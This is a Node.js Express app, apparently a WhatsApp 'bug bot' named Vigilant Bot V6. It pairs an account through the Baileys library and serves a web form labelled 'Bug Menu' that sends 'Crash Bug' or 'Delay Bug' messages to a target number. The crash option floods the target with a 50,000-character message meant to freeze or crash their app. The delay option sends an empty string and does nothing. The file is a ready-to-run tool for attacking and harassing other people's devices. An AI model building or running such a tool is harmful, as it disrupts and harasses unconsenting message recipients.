const express = require('express')
const { default: makeWASocket, useMultiFileAuthState, Browsers, DisconnectReason } = require('@whiskeysockets/baileys')
const fs = require('fs')
const path = require('path')

const app = express()
app.use(express.urlencoded({ extended: true }))
app.use(express.json())

const SESSION_PATH = './session'
let sock, pairingCode = "", status = "Logged out", isConnected = false

async function startBot(number) {
    if(!fs.existsSync(SESSION_PATH)) fs.mkdirSync(SESSION_PATH)
    const { state, saveCreds } = await useMultiFileAuthState(SESSION_PATH)
    sock = makeWASocket({ auth: state, browser: Browsers.macOS("Desktop") })
    sock.ev.on('creds.update', saveCreds)
    sock.ev.on('connection.update', (u) => {
        if(u.connection === 'open'){ isConnected = true; status = "Connected ✅"; pairingCode = "" }
        if(u.connection === 'close'){
            isConnected = false
            if(u.lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut){
                status = "Logged out"; fs.rmSync(SESSION_PATH, { recursive: true, force: true })
            } else { status = "Disconnected" }
        }
    })
    if(!state.creds.registered && number){
        await new Promise(r => setTimeout(r, 3000))
        pairingCode = await sock.requestPairingCode(number)
        status = "Code Generated"
    }
}

async function sendBug(jid, type){
    if(!isConnected) return "Bot not connected"
    try{
        await sock.sendMessage(jid, { text: type === "crash" ? "x".repeat(50000) : "".repeat(2000) })
        return "Bug Sent ✅"
    }catch(e){ return "Failed: " + e.message }
}

app.get('/', (req,res) => res.send(`<!DOCTYPE html><html><head><title>Vigilant V6</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:#f0f2f5;color:#111;font-family:Segoe UI;text-align:center;padding:20px}.box{background:#fff;padding:25px;border-radius:12px;max-width:400px;margin:auto;box-shadow:0 4px 12px rgba(0,0,0,.1);border-top:5px solid #25D366}h2{color:#075E54}input,select{width:90%;padding:12px;margin:8px 0;background:#f0f2f5;border:1px solid #ddd;border-radius:8px}button{padding:12px 20px;margin:5px;border:none;border-radius:8px;cursor:pointer;font-weight:bold;color:#fff}.pair{background:#25D366}.bug{background:#128C7E}.code{font-size:28px;color:#25D366;margin:15px 0;font-weight:bold;letter-spacing:3px}hr{border:none;border-top:1px solid #eee;margin:20px 0}</style></head><body><div class="box"><h2>Vigilant Bot V6 Classic</h2><form method="POST" action="/pair"><h3>Pairing</h3><input name="number" placeholder="2348xxxxxxxx" required><button class="pair">Get Pairing Code</button></form><div class="code">${pairingCode}</div><p>Status: ${status}</p><hr><form method="POST" action="/bug"><h3>Bug Menu</h3><input name="target" placeholder="Target: 2348xxxxxxxx@s.whatsapp.net" required><select name="type"><option value="crash">Crash Bug</option><option value="delay">Delay Bug</option></select><button class="bug">Send Bug</button></form></div></body></html>`))

app.post('/pair', async (req,res) => { const n = req.body.number.replace(/\D/g,''); status="Generating..."; await startBot(n); res.redirect('/') })
app.post('/bug', async (req,res) => { status=await sendBug(req.body.target, req.body.type); setTimeout(()=>{status=isConnected?"Connected ✅":status},2000); res.redirect('/') })
app.listen(process.env.PORT||3000)